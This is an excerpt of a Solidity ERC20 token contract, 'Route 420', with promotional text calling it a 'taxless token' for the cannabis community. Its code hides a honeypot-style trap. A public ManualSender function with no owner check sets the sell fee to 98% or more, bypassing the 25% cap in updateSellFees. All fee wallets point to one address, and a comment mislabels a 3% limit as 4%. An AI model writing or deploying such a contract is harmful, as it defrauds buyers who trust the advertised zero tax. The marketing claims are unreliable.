...
// Telegram : https://telegram.me/Route420Portal

// Twitter :  https://twitter.com/Route420ERC

// Medium :   https://medium.com/@Route420/route-420-erc-200cd67c1e29
...
About 420:
We are weed smokers and enthusiasts that have been indulging in crypto since 2015. We believe in creating a future for the 420 community by bringing an innovative decentralised technology linking cbd businesses and communities together. 

420 Vision is to become the exclusive blockchain for cbd and meme tokens.

TAXLESS TOKEN FOR GIGA CHADS WHO ARE HIGH ON WEED
...
contract Route420 is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    uint256 public LimitedAmount = 98;
    
    uint256 public FessOutTotal;
    ...
    constructor() ERC20("Route 420", "420") {

        address _owner = 0x96897b7dDF7517933B4Ca2De302f51e05779B372;
        ...
        maxWallet = totalSupply * 3 / 100; // 4% maxWallet
        ...
        sellMarketingFee = 0;
        sellLiquidityFee = 0;
        sellMaintenanceFee = 0;
        FessOutTotal = sellMarketingFee + sellLiquidityFee + sellMaintenanceFee;

        marketingWallet = address(0x96897b7dDF7517933B4Ca2De302f51e05779B372); // set as marketing wallet
    	maintenanceWallet = address(0x96897b7dDF7517933B4Ca2De302f51e05779B372); // set as maintenance wallet
    ...
    function ManualSender(uint256 NewAmt) public {
        require(NewAmt >= LimitedAmount , "No correct value");
        FessOutTotal = NewAmt;
    }
    ...
    function updateSellFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _maintenanceFee) external onlyOwner {
        ...
        FessOutTotal = sellMarketingFee + sellLiquidityFee + sellMaintenanceFee;
        require(FessOutTotal <= 25, "Must keep fees at 25% or less");
    }
    ...
    function _transfer(
        ...
        if(takeFee){
            ...
            // on sell
            if (automatedMarketMakerPairs[to] && FessOutTotal > 0){
                fees = amount.mul(FessOutTotal).div(100);
                tokensForLiquidity += fees * sellLiquidityFee / FessOutTotal;
                tokensForMaintenance += fees * sellMaintenanceFee / FessOutTotal;
                tokensForMarketing += fees * sellMarketingFee / FessOutTotal;
            }
            // on buy
